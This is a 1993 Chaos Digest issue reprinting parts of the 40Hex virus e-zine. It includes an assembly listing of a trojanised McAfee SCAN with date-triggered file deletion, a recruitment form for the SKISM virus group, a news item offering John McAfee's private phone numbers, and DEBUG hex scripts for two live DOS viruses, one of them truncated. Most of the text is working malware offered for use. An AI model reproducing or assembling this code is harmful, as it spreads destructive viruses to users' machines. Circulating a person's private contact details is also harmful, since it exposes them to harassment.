Chaos Digest              Jeudi 27 Mai 1993        Volume 1 : Numero 39
                           ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.39 (27 Mai 1993)
File 1--40H VMag Issue 1 Volume 3 #004(3)-008(1) (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Issue 1 Volume 3 #004(3)-008(1) (reprint)

[suite du listing du SCAN de John McAfee]


sub_39          proc    near
                push    ax
                mov     ah,2
                int     21h
                pop     ax
                retn
sub_39          endp

sub_40          proc    near
                push    dx
                mov     dl,0Dh
                call    sub_39
                mov     dl,0Ah
                call    sub_39
                pop     dx
                retn
sub_40          endp

                db      0, 0, 0, 0, 0ACh, 29h
                db      0ADh, 29h, 0AEh, 29h, 0AFh, 29h
                db      0B0h, 29h, 0E9h, 6Ch, 2, 0E9h
                db      45h, 2, 0
                db      13 dup (0)
                db      0E9h, 60h, 0Dh, 0Dh, 0, 0
                db      0
                db      44h, 29h
                db      42 dup (0)
                db      0D2h, 7, 1, 1
                db      13 dup (0)
                db      3, 2, 0CFh, 0CEh, 0Dh, 0CDh
                db      0Dh
                db      79 dup (0)
                db      0Dh, 0Ah, 'Please enter the passw'
                db      'ord now: '
                db      0
                db      0Dh, 0Ah, 'This program requires '
                db      'DOS 3.00 or greater'
                db      7, 0Dh, 0Ah, 0, 5Ch, 2Ah
                db      2Eh, 2Ah, 0
                db      0Dh, 0Ah, 'Access denied'
                db      7, 0Dh, 0Ah, 0, 42h, 23h
                db      0
                db      305 dup (0)
                db      50h, 53h, 0A1h, 1, 1, 5
                db      3, 1, 0D1h, 0E8h, 0D1h, 0E8h
                db      0D1h, 0E8h, 0D1h, 0E8h, 8Bh, 0D8h
                db      8Ch, 0C8h, 3, 0C3h, 50h, 0B8h
                db      67h, 2, 50h, 0CBh, 5Bh, 58h
                db      2Eh, 0C6h, 6, 1Ah, 0, 0FFh
                db      2Eh, 8Ch, 6, 17h, 1, 2Eh
                db      0A3h, 19h, 1, 2Eh, 89h, 26h
                db      1Bh, 1, 2Eh, 8Ch, 16h, 1Dh
                db      1, 8Ch, 0C8h, 8Eh, 0D0h, 0BCh
                db      4Bh, 2, 2Eh, 0A1h, 19h, 1
                db      50h, 53h, 51h, 52h, 56h, 57h
                db      55h, 1Eh, 6, 8Ch, 0C8h, 8Eh
                db      0D8h, 8Eh, 0C0h, 0A0h, 1Bh, 0
                db      3Ch, 50h, 75h, 6, 0E8h, 6Ch
                db      0, 0EBh, 15h, 90h, 3Ch, 44h
                db      75h, 6, 0E8h, 7Ah, 0, 0EBh
                db      0Bh, 90h
loc_80:
                cmp     al,4Ch
                jne     loc_81
                call    sub_42
                jmp     short loc_82
loc_81:
                stc
loc_82:
                jc      loc_85
                pop     es
                pop     ds
                pop     bp
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                cmp     byte ptr cs:data_7e,0
                je      loc_83
                mov     ax,cs:data_4e
                mov     ds:data_1e,ax
                mov     ax,cs:data_5e
                mov     ds:data_2e,ax
                mov     ax,100h
                mov     cs:data_4e,ax
                mov     cs:data_5e,ds
                jmp     short loc_84
loc_83:
                mov     ax,cs
                sub     ax,cs:data_6e
                add     cs:data_5e,ax
loc_84:
                pop     ax
                mov     ss,word ptr cs:[11Dh]
                mov     sp,word ptr cs:[11Bh]
                jmp     dword ptr cs:data_4e
loc_85:
                mov     dx,104h
                call    sub_45
                mov     ax,4CFFh
                int     21h
                db      0BAh, 0AEh, 0, 0E8h, 0B6h, 0
                db      0C6h, 6, 58h, 0, 29h, 0BAh
                db      58h, 0, 0E8h, 79h, 0, 0E8h
                db      0C2h, 0, 0E8h, 8Ch, 0, 0C3h

sub_41          proc    near
                mov     ah,2Ah
                int     21h
                cmp     cx,ds:data_8e
                jb      loc_88
                cmp     dh,ds:data_9e
                jb      loc_88
                cmp     dl,ds:data_10e
                jb      loc_88
                mov     ah,30h
                int     21h
                cmp     al,3
                jae     loc_86
                mov     dx,0D0h
                call    sub_45
                clc
                jmp     short loc_88
                db      90h
loc_86:
                push    ds
                push    es
                xor     al,al
                mov     cx,8000h
                mov     es,word ptr cs:copyright+1
                mov     es,es:data_3e
                xor     di,di
loc_87:
                repne   scasb
                scasb
                jnz     loc_87
                add     di,2
                push    es
                pop     ds
                mov     dx,di
                mov     ah,41h
                int     21h
                clc
                pop     es
                pop     ds
loc_88:
                cmc
                retn
sub_41          endp

sub_42          proc    near
                mov     ah,1Ah
                mov     dx,83h
                int     21h
                mov     ah,4Eh
                mov     cx,8
                mov     dx,0FFh
                int     21h
                mov     si,0A1h
                mov     di,4Bh
                cld
loc_89:
                lodsb
                scasb
                stc
                jnz     loc_ret_90
                or      al,al
                jnz     loc_89

loc_ret_90:
                retn
sub_42          endp

sub_43          proc    near
                push    ax
                push    bx
                push    cx
                mov     ah,0Ah
                int     21h
                mov     bx,dx
                inc     bx
                mov     cl,[bx]
                xor     ch,ch
                jcxz    loc_92

locloop_91:
                inc     bx
                not     byte ptr [bx]
                loop    locloop_91

loc_92:
                pop     cx
                pop     bx
                pop     ax
                retn
sub_43          endp

sub_44          proc    near
                push    cx
                push    si
                push    di
                mov     cl,ds:data_11e
                xor     ch,ch
                mov     si,59h
                mov     di,1Dh
                cld
                repe    cmpsb
                jz      loc_93
                stc
loc_93:
                pop     di
                pop     si
                pop     cx
                retn
sub_44          endp

sub_45          proc    near
                push    bx
                push    dx
                mov     bx,dx
loc_94:
                mov     dl,[bx]
                or      dl,dl
                jz      loc_95
                call    sub_46
                inc     bx
                jmp     short loc_94
loc_95:
                pop     dx
                pop     bx
                retn
sub_45          endp

sub_46          proc    near
                push    ax
                mov     ah,2
                int     21h
                pop     ax
                retn
sub_46          endp

sub_47          proc    near
                push    dx
                mov     dl,0Dh
                call    sub_46
                mov     dl,0Ah
                call    sub_46
                pop     dx
                retn
sub_47          endp

                db      0, 0ACh, 29h, 0ADh, 29h, 0AEh
                db      29h, 0AFh, 29h, 0B0h, 29h, 0E9h
                db      6Ch, 2
loc_96:
                jmp     loc_97
                db      0
                db      13 dup (0)
                db      0E9h, 60h, 11h, 0Dh, 0, 0
                db      0
                db      44h, 29h
                db      42 dup (0)
                db      0D0h, 7, 6, 6
                db      13 dup (0)
                db      3, 2, 0CFh, 0C9h, 0Dh, 0CFh
                db      0Dh
                db      79 dup (0)
                db      0Dh, 0Ah, 'Please enter the passw'
                db      'ord now: '
                db      0
                db      0Dh, 0Ah, 'This program requires '
                db      'DOS 3.00 or greater'
                db      7, 0Dh, 0Ah, 0, 5Ch, 2Ah
                db      2Eh, 2Ah, 0
                db      0Dh, 0Ah, 'Access denied'
                db      7, 0Dh, 0Ah, 0, 42h, 23h
                db      0
                db      305 dup (0)
loc_97:
                push    ax
                push    bx
                mov     ax,word ptr ds:[101h]
                add     ax,103h
                shr     ax,1
                shr     ax,1
                shr     ax,1
                shr     ax,1
                mov     bx,ax
                mov     ax,cs
                add     ax,bx
                push    ax
                mov     ax,267h
                push    ax
                retf
                db      5Bh, 58h, 2Eh, 0C6h, 6, 1Ah
                db      0, 0FFh, 2Eh, 8Ch, 6, 17h
                db      1, 2Eh, 0A3h, 19h, 1, 2Eh
                db      89h, 26h, 1Bh, 1, 2Eh, 8Ch
                db      16h, 1Dh, 1, 8Ch, 0C8h, 8Eh
                db      0D0h, 0BCh, 4Bh, 2, 2Eh, 0A1h
                db      19h, 1, 50h, 53h, 51h, 52h
                db      56h, 57h, 55h, 1Eh, 6, 8Ch
                db      0C8h, 8Eh, 0D8h, 8Eh, 0C0h, 0A0h
                db      1Bh, 0, 3Ch, 50h, 75h, 6
                db      0E8h, 6Ch, 0, 0EBh, 15h, 90h
                db      3Ch, 44h, 75h, 6, 0E8h, 7Ah
                db      0, 0EBh, 0Bh, 90h
loc_98:
                cmp     al,4Ch
                jne     loc_99
                call    sub_49
                jmp     short loc_100
loc_99:
                stc
loc_100:
                jc      loc_103
                pop     es
                pop     ds
                pop     bp
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                cmp     byte ptr cs:data_7e,0
                je      loc_101
                mov     ax,cs:data_4e
                mov     ds:data_1e,ax
                mov     ax,cs:data_5e
                mov     ds:data_2e,ax
                mov     ax,100h
                mov     cs:data_4e,ax
                mov     cs:data_5e,ds
                jmp     short loc_102
loc_101:
                mov     ax,cs
                sub     ax,cs:data_6e
                add     cs:data_5e,ax
loc_102:
                pop     ax
                mov     ss,word ptr cs:[11Dh]
                mov     sp,word ptr cs:[11Bh]
                jmp     dword ptr cs:data_4e
loc_103:
                mov     dx,104h
                call    sub_52
                mov     ax,4CFFh
                int     21h
                db      0BAh, 0AEh, 0, 0E8h, 0B6h, 0
                db      0C6h, 6, 58h, 0, 29h, 0BAh
                db      58h, 0, 0E8h, 79h, 0, 0E8h
                db      0C2h, 0, 0E8h, 8Ch, 0, 0C3h

sub_48          proc    near
                mov     ah,2Ah
                int     21h
                cmp     cx,ds:data_8e
                jb      loc_106
                cmp     dh,ds:data_9e
                jb      loc_106
                cmp     dl,ds:data_10e
                jb      loc_106
                mov     ah,30h
                int     21h
                cmp     al,3
                jae     loc_104
                mov     dx,0D0h
                call    sub_52
                clc
                jmp     short loc_106
                db      90h
loc_104:
                push    ds
                push    es
                xor     al,al
                mov     cx,8000h
                mov     es,word ptr cs:copyright+1
                mov     es,es:data_3e
                xor     di,di
loc_105:
                repne   scasb
                scasb
                jnz     loc_105
                add     di,2
                push    es
                pop     ds
                mov     dx,di
                mov     ah,41h
                int     21h
                clc
                pop     es
                pop     ds
loc_106:
                cmc
                retn
sub_48          endp

sub_49          proc    near
                mov     ah,1Ah
                mov     dx,83h
                int     21h
                mov     ah,4Eh
                mov     cx,8
                mov     dx,0FFh
                int     21h
                mov     si,0A1h
                mov     di,4Bh
                cld
loc_107:
                lodsb
                scasb
                stc
                jnz     loc_ret_108
                or      al,al
                jnz     loc_107

loc_ret_108:
                retn
sub_49          endp

sub_50          proc    near
                push    ax
                push    bx
                push    cx
                mov     ah,0Ah
                int     21h
                mov     bx,dx
                inc     bx
                mov     cl,[bx]
                xor     ch,ch
                jcxz    loc_110

locloop_109:
                inc     bx
                not     byte ptr [bx]
                loop    locloop_109

loc_110:
                pop     cx
                pop     bx
                pop     ax
                retn
sub_50          endp

sub_51          proc    near
                push    cx
                push    si
                push    di
                mov     cl,ds:data_11e
                xor     ch,ch
                mov     si,59h
                mov     di,1Dh
                cld
                repe    cmpsb
                jz      loc_111
                stc
loc_111:
                pop     di
                pop     si
                pop     cx
                retn
sub_51          endp

sub_52          proc    near
                push    bx
                push    dx
                mov     bx,dx
loc_112:
                mov     dl,[bx]
                or      dl,dl
                jz      loc_113
                call    sub_53
                inc     bx
                jmp     short loc_112
loc_113:
                pop     dx
                pop     bx
                retn
sub_52          endp

sub_53          proc    near
                push    ax
                mov     ah,2
                int     21h
                pop     ax
                retn
sub_53          endp

sub_54          proc    near
                push    dx
                mov     dl,0Dh
                call    sub_53
                mov     dl,0Ah
                call    sub_53
                pop     dx
                retn
sub_54          endp

                db      0F0h, 0FDh, 0C5h, 0AAh, 0FFh, 0F0h
                db      8Dh, 6Dh, 0B2h
                db      73h

seg_a           ends

                end     start

+++++

40Hex Issue 3                                                      0005

                  Application For Membership To SKISM


    SKISM is quickly becoming one of the largest virus creators/
    distributers in America.  Part of getting bigger is branching
    out in new directions and getting more members.

    If you wish to apply for membership to SKISM or if you want
    your board to become to become a SKISM distribution site
    fill out the application below and upload it to one of the
    SKISM home bases listed in file one of this archive.

    Keep in mind, from the start of the group SKISM we have been
    virus authors, not trojan, bomb, or any other such distructive
    mechanism.  The entire purpose of SKISM is virus reserch, to
    better understand the situation today with computer viruses.

    Therefore trojan and bomb authors shall apply elsewere, when
    you brush up your work, come back.  No disrespect intended.

-------------------------------------------------------------------------

                       Application For Membership


I am interested in becoming

___ A SKISM Member
___ A SKISM Distribution Site Sysop


Handle:      ________________
Aliases:     ________________
First Name:  ________________  (Used only for verification)


Have you ever written a computer virus(es)? ___
If yes name it/them: _______________________________________
                     _______________________________________

Programming Languages you know: ____________________________ Know Well
                                ____________________________    :
                                ____________________________    :
                                ____________________________ Hardly Know

Are you a sysop of a BBS?  ___
If yes leave the vitals:
                         BBS Name: _________________________
                         Dialup:   _________________________
                         State:    _________________________
                         Running:  example: Telegard._______

Are you in any way connected to and law enforcment agency? ___
Do you realize that being untruthfull to the above question
waviers all legal matters: ____
Are you in anyway connected to any software company? ___

List three people you know (handles) : _________________
                                       _________________
                                       _________________

List three BBS that you have elite access to:

Name: _____________________   Dialup: _______________________
Name: _____________________   Dialup: _______________________
Name: _____________________   Dialup: _______________________

Thank you.

Please upload this applcation to one of the SKISM distribution site
mentioned in the first file of this archive.

+++++

40Hex Issue 3                                                      0006

                               Virus News

10/91
-----

Well the virus world is going as good as ever, dispite the over 20
virus scanners/removers out there.

The October 28th issue of PC-Magazine did a huge artical on the newest
virus scanner/defense systems.  Mentioned in the artical were SKISM-1
and Captian Trips.

There is a new catagory of viruses out there, DIR-2 viruses.  Havent
located one as of yet, but hope to in the near future.

Bogus SCANS continue to surface in the public domain.  As if SCAN 82
was not played with enough, there have been many reports of bogus
versions SCAN 84.  Most of which contian trojan bombs and will distroy
the FAT table or boot sector of you hard disk upon execution.

I have the unreleased phone numbers of John Mcafee. Including his
private office, home, and fax numbers.  Get a hold of me somehow and I
will get them to you.

Theres a bogus version of the Red Cross virus going around on h/p
boards.  The first command is to terminate the program.  Things people
do for credit these days.

In case you haven't yet heard Patti Hoffmans VSUM, virus information
summary is now a giant hyper-text database.  It's really a good
program, check it out.  Can't wait to see a bogus version of that
going around.

That's it for no - till later.

+++++

40Hex Issue 3                                                      0007

                     The Darth Vader Virus Strain B

     The Darth Vader virus is pretty cool because it is a little
     differnt than most other viruses.  Instead of going resident
     and infecting all programs run, it infects the stack space
     of all .COM files, as they are copied.  Pretty cool, huh?

     This virus only infects .COM files with a stack space equal
     to its own size.

     It's orgin is Bulgeria, hmmm, has Bulgeria become the virus
     captial of the world all of a sudden???

     Well here it is, enjoy.

----------------------------------------------------------------------------
n darth-2.com
e 0100  E8 00 00 5E 83 EE 03 89 36 F0 00 A3 FE 00 31 C0
e 0110  8E D8 8E 06 AE 00 B8 00 90 8E D8 31 FF 47 81 FF
e 0120  00 0F 77 58 57 31 F6 B9 58 01 F3 A6 5F E3 02 EB
e 0130  EC 2E 8B 36 F0 00 2E 89 3E F2 00 0E 1F B9 58 01
e 0140  F3 A4 06 1F 8B F7 46 74 33 56 AD 93 AC 81 FB 36
e 0150  FF 74 03 5E EB F0 3C 16 75 F9 5E 56 2E 8B 3E F2
e 0160  00 89 3E 04 00 81 C7 41 01 A5 A5 A4 5F B0 9A AA
e 0170  B8 95 00 2E 03 06 F2 00 AB 8C C0 AB 0E 0E 1F 07
e 0180  BF 00 01 57 8B 36 F0 00 81 C6 47 01 A5 A4 A1 FE
e 0190  00 C3 E9 9C 00 2E 8C 1E 0A 00 2E 89 16 0C 00 2E
e 01A0  89 0E 0E 00 50 53 51 06 56 57 80 FC 40 75 E3 81
e 01B0  F9 68 01 72 DD B8 20 12 CD 2F 26 8A 1D B8 16 12
e 01C0  CD 2F 83 C7 28 0E 1F BE 4A 01 03 36 04 00 B9 03
e 01D0  00 F3 A6 75 5C 1E 07 2E 8E 1E 0A 00 2E 8B 36 0C
e 01E0  00 BF 47 01 2E 03 3E 04 00 A5 A4 B8 00 90 8E C0
e 01F0  2E 8B 0E 0E 00 31 FF 46 49 74 36 51 56 B9 58 01
e 0200  F3 A6 5E E3 03 59 EB ED 59 56 1E 2E 8E 06 0A 00
e 0210  2E 8B 3E 0C 00 B0 E9 AA 2E 2B 36 0C 00 83 EE 03
e 0220  8B C6 AB 07 5F 0E 1F 2E 8B 36 04 00 B9 58 01 F3
e 0230  A4 5F 5E 07 59 5B 58 2E 8B 16 0C 00 2E 8E 1E 0A
e 0240  00 00 00 00 00 00 CB CD 20 90 43 4F 4D 44 61 72
e 0250  74 68 20 56 61 64 65 72 90 1A 1A 1A 1A 1A 1A 1A
rcx
159
w
q

+++++

40Hex Issue 3                                                        0008

                             Mystery Virus


        Actually I do know what this virus is, but being Halloween time
        and all I thought I'd let you find out for yourself.

-------------------------------------------------------------------------
n mystery.com
e 0100  E9 4B 00 CD 21 2E 56 53 2E 00 8C C3 83 C3 10 2E
e 0110  03 9C 3C 07 2E 89 9C 32 00 2E 8B 9C 3A 07 2E 89
e 0120  9C 30 00 8C C3 83 C3 10 2E 03 9C 40 07 8E D3 2E
e 0130  8B A4 3E 07 EA 00 00 00 00 BF 00 01 81 C6 42 07
e 0140  A4 A5 8B 26 06 00 33 DB 53 FF 64 F5 00 07 E8 00
e 0150  00 5E 83 EE 4C FC 2E 81 BC 42 07 4D 5A 74 0E FA
e 0160  8B E6 81 C4 FC 08 FB 3B 26 06 00 73 CC 2E C6 84
e 0170  76 00 C5 50 06 56 1E 0E 1F B8 00 C5 CD 21 3D 31
e 0180  67 75 04 07 E9 AB 00 07 B4 49 CD 21 BB FF FF B4
e 0190  48 CD 21 81 EB E8 00 73 03 E9 96 00 8C C1 F9 13
e 01A0  CB B4 4A CD 21 BB E7 00 F9 26 19 1E 02 00 06 8E
e 01B0  C1 B4 4A CD 21 8C C0 48 8E D8 C7 06 01 00 08 00
e 01C0  E8 E1 05 8B D8 8B CA 1F 8C D8 E8 D7 05 03 06 06
e 01D0  00 83 D2 00 2B C3 1B D1 72 04 29 06 06 00 1E 0E
e 01E0  2E C6 84 F5 00 62 33 FF 8E DF 1F B9 95 07 90 F3
e 01F0  A4 26 C7 06 49 07 00 00 B8 00 62 CD 21 8E DB 8B
e 0200  3E 08 00 8B DF 8B 3E 06 00 47 8E DB 8B 5D 02 8B
e 0210  3D 83 C7 1A 26 89 1E 93 07 8C C1 8E C3 FA B8 EA
e 0220  00 AA B8 38 03 AB 8B C1 AB 8E C1 26 89 3E 91 07
e 0230  FB 07 B8 00 2A CD 21 3A D6 74 14 E9 8D 00 69 62
e 0240  6D 40 40 53 4E 53 20 20 20 20 20 20 20 20 20 0E
e 0250  1F 5E 56 2E C6 84 68 01 CD B0 02 B9 01 00 33 D2
e 0260  2E C6 84 69 01 25 8B DE 81 C3 26 03 56 2D 4C 5A
e 0270  5E 72 58 06 1E 07 2E C6 84 B1 01 26 2E C6 84 B0
e 0280  01 CD 8B FB 81 C7 F3 01 56 8B F3 83 C6 0B B9 09
e 0290  00 83 3C 00 74 16 F3 A4 5E 8B FB 83 C7 03 56 81
e 02A0  C6 39 01 B9 11 00 AC 2C 20 AA E2 FA 5E 56 33 D2
e 02B0  B0 02 B9 01 00 0C 1B 58 5E 07 72 0F 0E 1F 58 1F
e 02C0  B8 03 C5 CD 21 58 B8 00 4C CD 21 5E 07 58 06 1F
e 02D0  2E 81 BC 42 07 4D 5A 75 03 E9 2E FE E9 5A FE 50
e 02E0  53 51 52 56 57 06 1E 0E 1F 80 3E 39 07 01 75 2A
e 02F0  B8 03 00 CD 10 C6 06 35 07 09 C6 06 38 07 00 C6
e 0300  06 36 07 00 C6 06 37 07 00 C6 06 33 07 00 C6 06
e 0310  39 07 00 90 C7 06 31 07 D2 06 80 3E 33 07 01 75
e 0320  03 E9 D5 00 80 3E 30 07 00 74 07 FE 0E 30 07 E9
e 0330  C7 00 8B 1E 31 07 83 3F FF 75 13 E4 61 24 FC E6
e 0340  61 C6 06 34 07 00 C6 06 33 07 01 E9 AB 00 80 3E
e 0350  34 07 01 75 03 E9 92 00 B0 B6 E6 43 8A 47 02 A2
e 0360  30 07 C6 06 34 07 01 8B 1F B8 DD 34 BA 12 00 F7
e 0370  F3 E6 42 8A C4 E6 42 E4 61 0C 03 E6 61 83 06 31
e 0380  07 03 8A 36 37 07 8D 36 A5 06 B9 03 00 80 3E 35
e 0390  07 0F 7E 09 C6 06 35 07 09 90 EB 0E 90 80 3E 35
e 03A0  07 09 73 06 C6 06 35 07 0F 90 8A 1E 35 07 8A 16
e 03B0  36 07 E8 4D 00 FE C6 E2 F1 80 06 36 07 02 80 3E
e 03C0  38 07 01 74 19 80 3E 37 07 15 77 0C 80 06 37 07
e 03D0  02 FE 06 35 07 EB 22 90 C6 06 38 07 01 90 80 2E
e 03E0  37 07 02 FE 0E 35 07 EB 10 90 8A 07 A2 30 07 C6
e 03F0  06 34 07 00 83 06 31 07 01 1F 07 5F 5E 5A 59 5B
e 0400  58 CF 51 B7 00 B4 02 CD 10 B9 01 00 AC 0A C0 74
e 0410  18 2C 20 3C DF 74 04 3C DC 75 06 B9 22 00 80 C2
e 0420  21 B4 09 CD 10 FE C2 EB DC 59 C3 B0 03 CF E8 39
e 0430  01 E8 49 03 9D 80 FC 68 2E FF 2E 91 07 55 8B EC
e 0440  FF 76 06 9D 5D 9C FC 3D 00 4B 74 E2 80 FC 3C 74
e 0450  0A 80 FC 3E 74 4A 80 FC 5B 75 6F 2E 83 3E 49 07
e 0460  00 74 03 E9 A6 00 E8 B9 00 74 03 E9 9E 00 E8 0C
e 0470  03 9D E8 EB 00 73 03 E9 99 00 9C 06 0E 07 56 57
e 0480  51 50 BF 49 07 AB 8B F2 B9 41 00 AC AA 84 C0 74
e 0490  07 E2 F8 26 89 0E 49 07 58 59 5F 5E 07 9D 73 73
e 04A0  2E 3B 1E 49 07 75 65 85 DB 74 61 E8 CF 02 9D E8
e 04B0  AE 00 72 5F 9C 1E 0E 1F 52 BA 4B 07 E8 AB 00 2E
e 04C0  C7 06 49 07 00 00 5A 1F EB D3 80 FC 3D 74 35 80
e 04D0  FC 43 74 30 80 FC 56 74 2B 80 FC C5 75 2E 3C 03
e 04E0  74 06 B8 31 67 EB 37 90 1E B8 00 00 8E D8 FA C7
e 04F0  06 70 00 DA 01 8C 0E 72 00 FB 1F 2E C6 06 39 07
e 0500  01 EB 1B 90 E8 1B 00 75 03 E8 5E 00 E8 6E 02 9D
e 0510  E8 4D 00 9C 1E E8 70 02 C6 06 00 00 5A 1F 9D CA
e 0520  02 00 50 56 8B F2 AC 84 C0 74 24 3C 2E 75 F7 E8

------------------------------

End of Chaos Digest #1.39
************************************

Downloaded From P-80 International Information Systems 304-744-2253
